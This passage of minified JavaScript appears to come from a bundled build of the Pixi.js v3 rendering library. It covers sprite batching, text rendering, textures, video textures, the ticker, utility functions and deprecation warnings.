u=this.currentBatchSize*this.vertByteSize,c=t.worldTransform,p=c.a,d=c.b,f=c.c,v=c.d,g=c.tx,m=c.ty,y=this.colors,x=this.positions;this.renderer.roundPixels?(x[u]=p*n+f*s+g|0,x[u+1]=v*s+d*n+m|0,x[u+5]=p*i+f*s+g|0,x[u+6]=v*s+d*i+m|0,x[u+10]=p*i+f*o+g|0,x[u+11]=v*o+d*i+m|0,x[u+15]=p*n+f*o+g|0,x[u+16]=v*o+d*n+m|0):(x[u]=p*n+f*s+g,x[u+1]=v*s+d*n+m,x[u+5]=p*i+f*s+g,x[u+6]=v*s+d*i+m,x[u+10]=p*i+f*o+g,x[u+11]=v*o+d*i+m,x[u+15]=p*n+f*o+g,x[u+16]=v*o+d*n+m),x[u+2]=r.x0,x[u+3]=r.y0,x[u+7]=r.x1,x[u+8]=r.y1,x[u+12]=r.x2,x[u+13]=r.y2,x[u+17]=r.x3,x[u+18]=r.y3;var b=t.tint;y[u+4]=y[u+9]=y[u+14]=y[u+19]=(b>>16)+(65280&b)+((255&b)<<16)+(255*t.worldAlpha<<24),this.sprites[this.currentBatchSize++]=t}},i.prototype.flush=function(){if(0!==this.currentBatchSize){var t,e=this.renderer.gl;if(this.currentBatchSize>.5*this.size)e.bufferSubData(e.ARRAY_BUFFER,0,this.vertices);else{var r=this.positions.subarray(0,this.currentBatchSize*this.vertByteSize);e.bufferSubData(e.ARRAY_BUFFER,0,r)}for(var i,n,o,s,a=0,h=0,l=null,u=this.renderer.blendModeManager.currentBlendMode,c=null,p=!1,d=!1,f=0,v=this.currentBatchSize;v>f;f++)s=this.sprites[f],i=s._texture.baseTexture,n=s.blendMode,o=s.shader||this.shader,p=u!==n,d=c!==o,(l!==i||p||d)&&(this.renderBatch(l,a,h),h=f,a=0,l=i,p&&(u=n,this.renderer.blendModeManager.setBlendMode(u)),d&&(c=o,t=c.shaders?c.shaders[e.id]:c,t||(t=c.getShader(this.renderer)),this.renderer.shaderManager.setShader(t),t.uniforms.projectionMatrix.value=this.renderer.currentRenderTarget.projectionMatrix.toArray(!0),t.syncUniforms(),e.activeTexture(e.TEXTURE0))),a++;this.renderBatch(l,a,h),this.currentBatchSize=0}},i.prototype.renderBatch=function(t,e,r){if(0!==e){var i=this.renderer.gl;t._glTextures[i.id]?i.bindTexture(i.TEXTURE_2D,t._glTextures[i.id]):this.renderer.updateTexture(t),i.drawElements(i.TRIANGLES,6*e,i.UNSIGNED_SHORT,6*r*2),this.renderer.drawCount++}},i.prototype.start=function(){var t=this.renderer.gl;t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer);var e=this.vertByteSize;t.vertexAttribPointer(this.shader.attributes.aVertexPosition,2,t.FLOAT,!1,e,0),t.vertexAttribPointer(this.shader.attributes.aTextureCoord,2,t.FLOAT,!1,e,8),t.vertexAttribPointer(this.shader.attributes.aColor,4,t.UNSIGNED_BYTE,!0,e,16)},i.prototype.destroy=function(){this.renderer.gl.deleteBuffer(this.vertexBuffer),this.renderer.gl.deleteBuffer(this.indexBuffer),this.shader.destroy(),this.renderer=null,this.vertices=null,this.positions=null,this.colors=null,this.indices=null,this.vertexBuffer=null,this.indexBuffer=null,this.sprites=null,this.shader=null}},{"../../const":22,"../../renderers/webgl/WebGLRenderer":48,"../../renderers/webgl/utils/ObjectRenderer":62}],68:[function(t,e,r){function i(t,e,r){this.canvas=document.createElement("canvas"),this.context=this.canvas.getContext("2d"),this.resolution=r||h.RESOLUTION,this._text=null,this._style=null;var i=o.fromCanvas(this.canvas);i.trim=new s.Rectangle,n.call(this,i),this.text=t,this.style=e}var n=t("../sprites/Sprite"),o=t("../textures/Texture"),s=t("../math"),a=t("../utils"),h=t("../const");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.fontPropertiesCache={},i.fontPropertiesCanvas=document.createElement("canvas"),i.fontPropertiesContext=i.fontPropertiesCanvas.getContext("2d"),Object.defineProperties(i.prototype,{width:{get:function(){return this.dirty&&this.updateText(),this.scale.x*this._texture._frame.width},set:function(t){this.scale.x=t/this._texture._frame.width,this._width=t}},height:{get:function(){return this.dirty&&this.updateText(),this.scale.y*this._texture._frame.height},set:function(t){this.scale.y=t/this._texture._frame.height,this._height=t}},style:{get:function(){return this._style},set:function(t){t=t||{},"number"==typeof t.fill&&(t.fill=a.hex2string(t.fill)),"number"==typeof t.stroke&&(t.stroke=a.hex2string(t.stroke)),"number"==typeof t.dropShadowColor&&(t.dropShadowColor=a.hex2string(t.dropShadowColor)),t.font=t.font||"bold 20pt Arial",t.fill=t.fill||"black",t.align=t.align||"left",t.stroke=t.stroke||"black",t.strokeThickness=t.strokeThickness||0,t.wordWrap=t.wordWrap||!1,t.wordWrapWidth=t.wordWrapWidth||100,t.dropShadow=t.dropShadow||!1,t.dropShadowColor=t.dropShadowColor||"#000000",t.dropShadowAngle=t.dropShadowAngle||Math.PI/6,t.dropShadowDistance=t.dropShadowDistance||5,t.padding=t.padding||0,t.textBaseline=t.textBaseline||"alphabetic",t.lineJoin=t.lineJoin||"miter",t.miterLimit=t.miterLimit||10,this._style=t,this.dirty=!0}},text:{get:function(){return this._text},set:function(t){t=t.toString()||" ",this._text!==t&&(this._text=t,this.dirty=!0)}}}),i.prototype.updateText=function(){var t=this._style;this.context.font=t.font;for(var e=t.wordWrap?this.wordWrap(this._text):this._text,r=e.split(/(?:\r\n|\r|\n)/),i=new Array(r.length),n=0,o=this.determineFontProperties(t.font),s=0;s<r.length;s++){var a=this.context.measureText(r[s]).width;i[s]=a,n=Math.max(n,a)}var h=n+t.strokeThickness;t.dropShadow&&(h+=t.dropShadowDistance),this.canvas.width=(h+this.context.lineWidth)*this.resolution;var l=this.style.lineHeight||o.fontSize+t.strokeThickness,u=l*r.length;t.dropShadow&&(u+=t.dropShadowDistance),this.canvas.height=(u+2*this._style.padding)*this.resolution,this.context.scale(this.resolution,this.resolution),navigator.isCocoonJS&&this.context.clearRect(0,0,this.canvas.width,this.canvas.height),this.context.font=t.font,this.context.strokeStyle=t.stroke,this.context.lineWidth=t.strokeThickness,this.context.textBaseline=t.textBaseline,this.context.lineJoin=t.lineJoin,this.context.miterLimit=t.miterLimit;var c,p;if(t.dropShadow){this.context.fillStyle=t.dropShadowColor;var d=Math.cos(t.dropShadowAngle)*t.dropShadowDistance,f=Math.sin(t.dropShadowAngle)*t.dropShadowDistance;for(s=0;s<r.length;s++)c=t.strokeThickness/2,p=t.strokeThickness/2+s*l+o.ascent,"right"===t.align?c+=n-i[s]:"center"===t.align&&(c+=(n-i[s])/2),t.fill&&this.context.fillText(r[s],c+d,p+f+this._style.padding)}for(this.context.fillStyle=t.fill,s=0;s<r.length;s++)c=t.strokeThickness/2,p=t.strokeThickness/2+s*l+o.ascent,"right"===t.align?c+=n-i[s]:"center"===t.align&&(c+=(n-i[s])/2),t.stroke&&t.strokeThickness&&this.context.strokeText(r[s],c,p+this._style.padding),t.fill&&this.context.fillText(r[s],c,p+this._style.padding);this.updateTexture()},i.prototype.updateTexture=function(){var t=this._texture;t.baseTexture.hasLoaded=!0,t.baseTexture.resolution=this.resolution,t.baseTexture.width=this.canvas.width/this.resolution,t.baseTexture.height=this.canvas.height/this.resolution,t.crop.width=t._frame.width=this.canvas.width/this.resolution,t.crop.height=t._frame.height=this.canvas.height/this.resolution,t.trim.x=0,t.trim.y=-this._style.padding,t.trim.width=t._frame.width,t.trim.height=t._frame.height-2*this._style.padding,this._width=this.canvas.width/this.resolution,this._height=this.canvas.height/this.resolution,t.baseTexture.emit("update",t.baseTexture),this.dirty=!1},i.prototype.renderWebGL=function(t){this.dirty&&this.updateText(),n.prototype.renderWebGL.call(this,t)},i.prototype._renderCanvas=function(t){this.dirty&&this.updateText(),n.prototype._renderCanvas.call(this,t)},i.prototype.determineFontProperties=function(t){var e=i.fontPropertiesCache[t];if(!e){e={};var r=i.fontPropertiesCanvas,n=i.fontPropertiesContext;n.font=t;var o=Math.ceil(n.measureText("|Mq").width),s=Math.ceil(n.measureText("M").width),a=2*s;s=1.4*s|0,r.width=o,r.height=a,n.fillStyle="#f00",n.fillRect(0,0,o,a),n.font=t,n.textBaseline="alphabetic",n.fillStyle="#000",n.fillText("|Mq",0,s);var h,l,u=n.getImageData(0,0,o,a).data,c=u.length,p=4*o,d=0,f=!1;for(h=0;s>h;h++){for(l=0;p>l;l+=4)if(255!==u[d+l]){f=!0;break}if(f)break;d+=p}for(e.ascent=s-h,d=c-p,f=!1,h=a;h>s;h--){for(l=0;p>l;l+=4)if(255!==u[d+l]){f=!0;break}if(f)break;d-=p}e.descent=h-s,e.fontSize=e.ascent+e.descent,i.fontPropertiesCache[t]=e}return e},i.prototype.wordWrap=function(t){for(var e="",r=t.split("\n"),i=this._style.wordWrapWidth,n=0;n<r.length;n++){for(var o=i,s=r[n].split(" "),a=0;a<s.length;a++){var h=this.context.measureText(s[a]).width,l=h+this.context.measureText(" ").width;0===a||l>o?(a>0&&(e+="\n"),e+=s[a],o=i-h):(o-=l,e+=" "+s[a])}n<r.length-1&&(e+="\n")}return e},i.prototype.getBounds=function(t){return this.dirty&&this.updateText(),n.prototype.getBounds.call(this,t)},i.prototype.destroy=function(t){this.context=null,this.canvas=null,this._style=null,this._texture.destroy(void 0===t?!0:t)}},{"../const":22,"../math":32,"../sprites/Sprite":66,"../textures/Texture":71,"../utils":76}],69:[function(t,e,r){function i(t,e,r){s.call(this),this.uid=n.uid(),this.resolution=r||1,this.width=100,this.height=100,this.realWidth=100,this.realHeight=100,this.scaleMode=e||o.SCALE_MODES.DEFAULT,this.hasLoaded=!1,this.isLoading=!1,this.source=null,this.premultipliedAlpha=!0,this.imageUrl=null,this.isPowerOfTwo=!1,this.mipmap=!1,this._glTextures=[],t&&this.loadSource(t)}var n=t("../utils"),o=t("../const"),s=t("eventemitter3");i.prototype=Object.create(s.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.update=function(){this.realWidth=this.source.naturalWidth||this.source.width,this.realHeight=this.source.naturalHeight||this.source.height,this.width=this.realWidth/this.resolution,this.height=this.realHeight/this.resolution,this.isPowerOfTwo=n.isPowerOfTwo(this.realWidth,this.realHeight),this.emit("update",this)},i.prototype.loadSource=function(t){var e=this.isLoading;if(this.hasLoaded=!1,this.isLoading=!1,e&&this.source&&(this.source.onload=null,this.source.onerror=null),this.source=t,(this.source.complete||this.source.getContext)&&this.source.width&&this.source.height)this._sourceLoaded();else if(!t.getContext){this.isLoading=!0;var r=this;t.onload=function(){t.onload=null,t.onerror=null,r.isLoading&&(r.isLoading=!1,r._sourceLoaded(),r.emit("loaded",r))},t.onerror=function(){t.onload=null,t.onerror=null,r.isLoading&&(r.isLoading=!1,r.emit("error",r))},t.complete&&t.src&&(this.isLoading=!1,t.onload=null,t.onerror=null,t.width&&t.height?(this._sourceLoaded(),e&&this.emit("loaded",this)):e&&this.emit("error",this))}},i.prototype._sourceLoaded=function(){this.hasLoaded=!0,this.update()},i.prototype.destroy=function(){this.imageUrl?(delete n.BaseTextureCache[this.imageUrl],delete n.TextureCache[this.imageUrl],this.imageUrl=null,navigator.isCocoonJS||(this.source.src="")):this.source&&this.source._pixiId&&delete n.BaseTextureCache[this.source._pixiId],this.source=null,this.dispose()},i.prototype.dispose=function(){this.emit("dispose",this),this._glTextures.length=0},i.prototype.updateSourceImage=function(t){this.source.src=t,this.loadSource(this.source)},i.fromImage=function(t,e,r){var o=n.BaseTextureCache[t];if(void 0===e&&0!==t.indexOf("data:")&&(e=!0),!o){var s=new Image;e&&(s.crossOrigin=""),o=new i(s,r),o.imageUrl=t,s.src=t,n.BaseTextureCache[t]=o,o.resolution=n.getResolutionOfUrl(t)}return o},i.fromCanvas=function(t,e){t._pixiId||(t._pixiId="canvas_"+n.uid());var r=n.BaseTextureCache[t._pixiId];return r||(r=new i(t,e),n.BaseTextureCache[t._pixiId]=r),r}},{"../const":22,"../utils":76,eventemitter3:11}],70:[function(t,e,r){function i(t,e,r,i,c){if(!t)throw new Error("Unable to create RenderTexture, you must pass a renderer into the constructor.");e=e||100,r=r||100,c=c||u.RESOLUTION;var p=new n;if(p.width=e,p.height=r,p.resolution=c,p.scaleMode=i||u.SCALE_MODES.DEFAULT,p.hasLoaded=!0,o.call(this,p,new l.Rectangle(0,0,e,r)),this.width=e,this.height=r,this.resolution=c,this.render=null,this.renderer=t,this.renderer.type===u.RENDERER_TYPE.WEBGL){var d=this.renderer.gl;this.textureBuffer=new s(d,this.width,this.height,p.scaleMode,this.resolution),this.baseTexture._glTextures[d.id]=this.textureBuffer.texture,this.filterManager=new a(this.renderer),this.filterManager.onContextChange(),this.filterManager.resize(e,r),this.render=this.renderWebGL,this.renderer.currentRenderer.start(),this.renderer.currentRenderTarget.activate()}else this.render=this.renderCanvas,this.textureBuffer=new h(this.width*this.resolution,this.height*this.resolution),this.baseTexture.source=this.textureBuffer.canvas;this.valid=!0,this._updateUvs()}var n=t("./BaseTexture"),o=t("./Texture"),s=t("../renderers/webgl/utils/RenderTarget"),a=t("../renderers/webgl/managers/FilterManager"),h=t("../renderers/canvas/utils/CanvasBuffer"),l=t("../math"),u=t("../const"),c=new l.Matrix;i.prototype=Object.create(o.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.resize=function(t,e,r){(t!==this.width||e!==this.height)&&(this.valid=t>0&&e>0,this.width=this._frame.width=this.crop.width=t,this.height=this._frame.height=this.crop.height=e,r&&(this.baseTexture.width=this.width,this.baseTexture.height=this.height),this.valid&&(this.textureBuffer.resize(this.width,this.height),this.filterManager&&this.filterManager.resize(this.width,this.height)))},i.prototype.clear=function(){this.valid&&(this.renderer.type===u.RENDERER_TYPE.WEBGL&&this.renderer.gl.bindFramebuffer(this.renderer.gl.FRAMEBUFFER,this.textureBuffer.frameBuffer),this.textureBuffer.clear())},i.prototype.renderWebGL=function(t,e,r,i){if(this.valid){if(i=void 0!==i?i:!0,this.textureBuffer.transform=e,this.textureBuffer.activate(),t.worldAlpha=1,i){t.worldTransform.identity(),t.currentBounds=null;var n,o,s=t.children;for(n=0,o=s.length;o>n;++n)s[n].updateTransform()}var a=this.renderer.filterManager;this.renderer.filterManager=this.filterManager,this.renderer.renderDisplayObject(t,this.textureBuffer,r),this.renderer.filterManager=a}},i.prototype.renderCanvas=function(t,e,r,i){if(this.valid){i=!!i;var n=t.worldTransform,o=c;o.identity(),e&&o.append(e),t.worldTransform=o,t.worldAlpha=1;var s,a,h=t.children;for(s=0,a=h.length;a>s;++s)h[s].updateTransform();r&&this.textureBuffer.clear(),t.worldTransform=n;var l=this.textureBuffer.context,u=this.renderer.resolution;this.renderer.resolution=this.resolution,this.renderer.renderDisplayObject(t,l),this.renderer.resolution=u}},i.prototype.destroy=function(){o.prototype.destroy.call(this,!0),this.textureBuffer.destroy(),this.filterManager&&this.filterManager.destroy(),this.renderer=null},i.prototype.getImage=function(){var t=new Image;return t.src=this.getBase64(),t},i.prototype.getBase64=function(){return this.getCanvas().toDataURL()},i.prototype.getCanvas=function(){if(this.renderer.type===u.RENDERER_TYPE.WEBGL){var t=this.renderer.gl,e=this.textureBuffer.size.width,r=this.textureBuffer.size.height,i=new Uint8Array(4*e*r);t.bindFramebuffer(t.FRAMEBUFFER,this.textureBuffer.frameBuffer),t.readPixels(0,0,e,r,t.RGBA,t.UNSIGNED_BYTE,i),t.bindFramebuffer(t.FRAMEBUFFER,null);var n=new h(e,r),o=n.context.getImageData(0,0,e,r);return o.data.set(i),n.context.putImageData(o,0,0),n.canvas}return this.textureBuffer.canvas},i.prototype.getPixels=function(){var t,e;if(this.renderer.type===u.RENDERER_TYPE.WEBGL){var r=this.renderer.gl;t=this.textureBuffer.size.width,e=this.textureBuffer.size.height;var i=new Uint8Array(4*t*e);return r.bindFramebuffer(r.FRAMEBUFFER,this.textureBuffer.frameBuffer),r.readPixels(0,0,t,e,r.RGBA,r.UNSIGNED_BYTE,i),r.bindFramebuffer(r.FRAMEBUFFER,null),i}return t=this.textureBuffer.canvas.width,e=this.textureBuffer.canvas.height,this.textureBuffer.canvas.getContext("2d").getImageData(0,0,t,e).data},i.prototype.getPixel=function(t,e){if(this.renderer.type===u.RENDERER_TYPE.WEBGL){var r=this.renderer.gl,i=new Uint8Array(4);return r.bindFramebuffer(r.FRAMEBUFFER,this.textureBuffer.frameBuffer),r.readPixels(t,e,1,1,r.RGBA,r.UNSIGNED_BYTE,i),r.bindFramebuffer(r.FRAMEBUFFER,null),i}return this.textureBuffer.canvas.getContext("2d").getImageData(t,e,1,1).data}},{"../const":22,"../math":32,"../renderers/canvas/utils/CanvasBuffer":44,"../renderers/webgl/managers/FilterManager":53,"../renderers/webgl/utils/RenderTarget":64,"./BaseTexture":69,"./Texture":71}],71:[function(t,e,r){function i(t,e,r,n,o){a.call(this),this.noFrame=!1,e||(this.noFrame=!0,e=new h.Rectangle(0,0,1,1)),t instanceof i&&(t=t.baseTexture),this.baseTexture=t,this._frame=e,this.trim=n,this.valid=!1,this.requiresUpdate=!1,this._uvs=null,this.width=0,this.height=0,this.crop=r||e,this.rotate=!!o,t.hasLoaded?(this.noFrame&&(e=new h.Rectangle(0,0,t.width,t.height),t.on("update",this.onBaseTextureUpdated,this)),this.frame=e):t.once("loaded",this.onBaseTextureLoaded,this)}var n=t("./BaseTexture"),o=t("./VideoBaseTexture"),s=t("./TextureUvs"),a=t("eventemitter3"),h=t("../math"),l=t("../utils");i.prototype=Object.create(a.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{frame:{get:function(){return this._frame},set:function(t){if(this._frame=t,this.noFrame=!1,this.width=t.width,this.height=t.height,!this.trim&&!this.rotate&&(t.x+t.width>this.baseTexture.width||t.y+t.height>this.baseTexture.height))throw new Error("Texture Error: frame does not fit inside the base Texture dimensions "+this);this.valid=t&&t.width&&t.height&&this.baseTexture.hasLoaded,this.trim?(this.width=this.trim.width,this.height=this.trim.height,this._frame.width=this.trim.width,this._frame.height=this.trim.height):this.crop=t,this.valid&&this._updateUvs()}}}),i.prototype.update=function(){this.baseTexture.update()},i.prototype.onBaseTextureLoaded=function(t){this.frame=this.noFrame?new h.Rectangle(0,0,t.width,t.height):this._frame,this.emit("update",this)},i.prototype.onBaseTextureUpdated=function(t){this._frame.width=t.width,this._frame.height=t.height,this.emit("update",this)},i.prototype.destroy=function(t){this.baseTexture&&(t&&this.baseTexture.destroy(),this.baseTexture.off("update",this.onBaseTextureUpdated,this),this.baseTexture.off("loaded",this.onBaseTextureLoaded,this),this.baseTexture=null),this._frame=null,this._uvs=null,this.trim=null,this.crop=null,this.valid=!1},i.prototype.clone=function(){return new i(this.baseTexture,this.frame,this.crop,this.trim,this.rotate)},i.prototype._updateUvs=function(){this._uvs||(this._uvs=new s),this._uvs.set(this.crop,this.baseTexture,this.rotate)},i.fromImage=function(t,e,r){var o=l.TextureCache[t];return o||(o=new i(n.fromImage(t,e,r)),l.TextureCache[t]=o),o},i.fromFrame=function(t){var e=l.TextureCache[t];if(!e)throw new Error('The frameId "'+t+'" does not exist in the texture cache');return e},i.fromCanvas=function(t,e){return new i(n.fromCanvas(t,e))},i.fromVideo=function(t,e){return"string"==typeof t?i.fromVideoUrl(t,e):new i(o.fromVideo(t,e))},i.fromVideoUrl=function(t,e){return new i(o.fromUrl(t,e))},i.addTextureToCache=function(t,e){l.TextureCache[e]=t},i.removeTextureFromCache=function(t){var e=l.TextureCache[t];return delete l.TextureCache[t],delete l.BaseTextureCache[t],e},i.EMPTY=new i(new n)},{"../math":32,"../utils":76,"./BaseTexture":69,"./TextureUvs":72,"./VideoBaseTexture":73,eventemitter3:11}],72:[function(t,e,r){function i(){this.x0=0,this.y0=0,this.x1=1,this.y1=0,this.x2=1,this.y2=1,this.x3=0,this.y3=1}e.exports=i,i.prototype.set=function(t,e,r){var i=e.width,n=e.height;r?(this.x0=(t.x+t.height)/i,this.y0=t.y/n,this.x1=(t.x+t.height)/i,this.y1=(t.y+t.width)/n,this.x2=t.x/i,this.y2=(t.y+t.width)/n,this.x3=t.x/i,this.y3=t.y/n):(this.x0=t.x/i,this.y0=t.y/n,this.x1=(t.x+t.width)/i,this.y1=t.y/n,this.x2=(t.x+t.width)/i,this.y2=(t.y+t.height)/n,this.x3=t.x/i,this.y3=(t.y+t.height)/n)}},{}],73:[function(t,e,r){function i(t,e){if(!t)throw new Error("No video source element specified.");(t.readyState===t.HAVE_ENOUGH_DATA||t.readyState===t.HAVE_FUTURE_DATA)&&t.width&&t.height&&(t.complete=!0),o.call(this,t,e),this.autoUpdate=!1,this._onUpdate=this._onUpdate.bind(this),this._onCanPlay=this._onCanPlay.bind(this),t.complete||(t.addEventListener("canplay",this._onCanPlay),t.addEventListener("canplaythrough",this._onCanPlay),t.addEventListener("play",this._onPlayStart.bind(this)),t.addEventListener("pause",this._onPlayStop.bind(this))),this.__loaded=!1}function n(t,e){e||(e="video/"+t.substr(t.lastIndexOf(".")+1));var r=document.createElement("source");return r.src=t,r.type=e,r}var o=t("./BaseTexture"),s=t("../utils");i.prototype=Object.create(o.prototype),i.prototype.constructor=i,e.exports=i,i.prototype._onUpdate=function(){this.autoUpdate&&(window.requestAnimationFrame(this._onUpdate),this.update())},i.prototype._onPlayStart=function(){this.autoUpdate||(window.requestAnimationFrame(this._onUpdate),this.autoUpdate=!0)},i.prototype._onPlayStop=function(){this.autoUpdate=!1},i.prototype._onCanPlay=function(){this.hasLoaded=!0,this.source&&(this.source.removeEventListener("canplay",this._onCanPlay),this.source.removeEventListener("canplaythrough",this._onCanPlay),this.width=this.source.videoWidth,this.height=this.source.videoHeight,this.source.play(),this.__loaded||(this.__loaded=!0,this.emit("loaded",this)))},i.prototype.destroy=function(){this.source&&this.source._pixiId&&(delete s.BaseTextureCache[this.source._pixiId],delete this.source._pixiId),o.prototype.destroy.call(this)},i.fromVideo=function(t,e){t._pixiId||(t._pixiId="video_"+s.uid());var r=s.BaseTextureCache[t._pixiId];return r||(r=new i(t,e),s.BaseTextureCache[t._pixiId]=r),r},i.fromUrl=function(t,e){var r=document.createElement("video");if(Array.isArray(t))for(var o=0;o<t.length;++o)r.appendChild(n(t.src||t,t.mime));else r.appendChild(n(t.src||t,t.mime));return r.load(),r.play(),i.fromVideo(r,e)},i.fromUrls=i.fromUrl},{"../utils":76,"./BaseTexture":69}],74:[function(t,e,r){function i(){var t=this;this._tick=function(e){t._requestId=null,t.started&&(t.update(e),t.started&&null===t._requestId&&t._emitter.listeners(s,!0)&&(t._requestId=requestAnimationFrame(t._tick)))},this._emitter=new o,this._requestId=null,this._maxElapsedMS=100,this.autoStart=!1,this.deltaTime=1,this.elapsedMS=1/n.TARGET_FPMS,this.lastTime=0,this.speed=1,this.started=!1}var n=t("../const"),o=t("eventemitter3"),s="tick";Object.defineProperties(i.prototype,{FPS:{get:function(){return 1e3/this.elapsedMS}},minFPS:{get:function(){return 1e3/this._maxElapsedMS},set:function(t){var e=Math.min(Math.max(0,t)/1e3,n.TARGET_FPMS);this._maxElapsedMS=1/e}}}),i.prototype._requestIfNeeded=function(){null===this._requestId&&this._emitter.listeners(s,!0)&&(this.lastTime=performance.now(),this._requestId=requestAnimationFrame(this._tick))},i.prototype._cancelIfNeeded=function(){null!==this._requestId&&(cancelAnimationFrame(this._requestId),this._requestId=null)},i.prototype._startIfPossible=function(){this.started?this._requestIfNeeded():this.autoStart&&this.start()},i.prototype.add=function(t,e){return this._emitter.on(s,t,e),this._startIfPossible(),this},i.prototype.addOnce=function(t,e){return this._emitter.once(s,t,e),this._startIfPossible(),this},i.prototype.remove=function(t,e){return this._emitter.off(s,t,e),this._emitter.listeners(s,!0)||this._cancelIfNeeded(),this},i.prototype.start=function(){this.started||(this.started=!0,this._requestIfNeeded())},i.prototype.stop=function(){this.started&&(this.started=!1,this._cancelIfNeeded())},i.prototype.update=function(t){var e;t=t||performance.now(),e=this.elapsedMS=t-this.lastTime,e>this._maxElapsedMS&&(e=this._maxElapsedMS),this.deltaTime=e*n.TARGET_FPMS*this.speed,this._emitter.emit(s,this.deltaTime),this.lastTime=t},e.exports=i},{"../const":22,eventemitter3:11}],75:[function(t,e,r){var i=t("./Ticker"),n=new i;n.autoStart=!0,e.exports={shared:n,Ticker:i}},{"./Ticker":74}],76:[function(t,e,r){var i=t("../const"),n=e.exports={_uid:0,_saidHello:!1,pluginTarget:t("./pluginTarget"),async:t("async"),uid:function(){return++n._uid},hex2rgb:function(t,e){return e=e||[],e[0]=(t>>16&255)/255,e[1]=(t>>8&255)/255,e[2]=(255&t)/255,e},hex2string:function(t){return t=t.toString(16),t="000000".substr(0,6-t.length)+t,"#"+t},rgb2hex:function(t){return(255*t[0]<<16)+(255*t[1]<<8)+255*t[2]},canUseNewCanvasBlendModes:function(){if("undefined"==typeof document)return!1;var t="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAABAQMAAADD8p2OAAAAA1BMVEX/",e="AAAACklEQVQI12NgAAAAAgAB4iG8MwAAAABJRU5ErkJggg==",r=new Image;r.src=t+"AP804Oa6"+e;var i=new Image;i.src=t+"/wCKxvRF"+e;var n=document.createElement("canvas");n.width=6,n.height=1;var o=n.getContext("2d");o.globalCompositeOperation="multiply",o.drawImage(r,0,0),o.drawImage(i,2,0);var s=o.getImageData(2,0,1,1).data;return 255===s[0]&&0===s[1]&&0===s[2]},getNextPowerOfTwo:function(t){if(t>0&&0===(t&t-1))return t;for(var e=1;t>e;)e<<=1;return e},isPowerOfTwo:function(t,e){return t>0&&0===(t&t-1)&&e>0&&0===(e&e-1)},getResolutionOfUrl:function(t){var e=i.RETINA_PREFIX.exec(t);return e?parseFloat(e[1]):1},sayHello:function(t){if(!n._saidHello){if(navigator.userAgent.toLowerCase().indexOf("chrome")>-1){var e=["\n %c %c %c Pixi.js "+i.VERSION+" -  "+t+"   %c  %c  http://www.pixijs.com/  %c %c %c%c \n\n","background: #ff66a5; padding:5px 0;","background: #ff66a5; padding:5px 0;","color: #ff66a5; background: #030307; padding:5px 0;","background: #ff66a5; padding:5px 0;","background: #ffc3dc; padding:5px 0;","background: #ff66a5; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;"];window.console.log.apply(console,e)}else window.console&&window.console.log("Pixi.js "+i.VERSION+" - "+t+" - http://www.pixijs.com/");n._saidHello=!0}},isWebGLSupported:function(){var t={stencil:!0};try{if(!window.WebGLRenderingContext)return!1;var e=document.createElement("canvas"),r=e.getContext("webgl",t)||e.getContext("experimental-webgl",t);return!(!r||!r.getContextAttributes().stencil)}catch(i){return!1}},TextureCache:{},BaseTextureCache:{}}},{"../const":22,"./pluginTarget":77,async:2}],77:[function(t,e,r){function i(t){t.__plugins={},t.registerPlugin=function(e,r){t.__plugins[e]=r},t.prototype.initPlugins=function(){this.plugins=this.plugins||{};for(var e in t.__plugins)this.plugins[e]=new t.__plugins[e](this)},t.prototype.destroyPlugins=function(){for(var t in this.plugins)this.plugins[t].destroy(),this.plugins[t]=null;this.plugins=null}}e.exports={mixin:function(t){i(t)}}},{}],78:[function(t,e,r){var i=t("./core"),n=t("./mesh"),o=t("./extras"),s=t("./filters");i.SpriteBatch=function(){throw new ReferenceError("SpriteBatch does not exist any more, please use the new ParticleContainer instead.")},i.AssetLoader=function(){throw new ReferenceError("The loader system was overhauled in pixi v3, please see the new PIXI.loaders.Loader class.")},Object.defineProperties(i,{Stage:{get:function(){return console.warn("You do not need to use a PIXI Stage any more, you can simply render any container."),i.Container}},DisplayObjectContainer:{get:function(){return console.warn("DisplayObjectContainer has been shortened to Container, please use Container from now on."),i.Container}},Strip:{get:function(){return console.warn("The Strip class has been renamed to Mesh and moved to mesh.Mesh, please use mesh.Mesh from now on."),n.Mesh}},Rope:{get:function(){return console.warn("The Rope class has been moved to mesh.Rope, please use mesh.Rope from now on."),n.Rope}},MovieClip:{get:function(){return console.warn("The MovieClip class has been moved to extras.MovieClip, please use extras.MovieClip from now on."),o.MovieClip}},TilingSprite:{get:function(){return console.warn("The TilingSprite class has been moved to extras.TilingSprite, please use extras.TilingSprite from now on."),o.TilingSprite}},BitmapText:{get:function(){return console.warn("The BitmapText class has been moved to extras.BitmapText, please use extras.BitmapText from now on."),o.BitmapText}},blendModes:{get:function(){return console.warn("The blendModes has been moved to BLEND_MODES, please use BLEND_MODES from now on."),i.BLEND_MODES}},scaleModes:{get:function(){return console.warn("The scaleModes has been moved to SCALE_MODES, please use SCALE_MODES from now on."),i.SCALE_MODES}},BaseTextureCache:{get:function(){return console.warn("The BaseTextureCache class has been moved to utils.BaseTextureCache, please use utils.BaseTextureCache from now on."),i.utils.BaseTextureCache}},TextureCache:{get:function(){return console.warn("The TextureCache class has been moved to utils.TextureCache, please use utils.TextureCache from now on."),i.utils.TextureCache}},math:{get:function(){return console.warn("The math namespace is deprecated, please access members already accessible on PIXI."),i}}}),i.Sprite.prototype.setTexture=function(t){this.texture=t,console.warn("setTexture is now deprecated, please use the texture property, e.g : sprite.texture = texture;")},o.BitmapText.prototype.setText=function(t){this.text=t,console.warn("setText is now deprecated, please use the text property, e.g : myBitmapText.text = 'my text';")},i.Text.prototype.setText=function(t){this.text=t,console.warn("setText is now deprecated, please use the text property, e.g : myText.text = 'my text';")},i.Text.prototype.setStyle=function(t){this.style=t,console.warn("setStyle is now deprecated, please use the style property, e.g : myText.style = style;")},i.Texture.prototype.setFrame=function(t){this.frame=t,console.warn("setFrame is now deprecated, please use the frame property, e.g : myTexture.frame = frame;")},Object.defineProperties(s,{AbstractFilter:{get:function(){return console.warn("filters.AbstractFilter is an undocumented alias, please use AbstractFilter from now 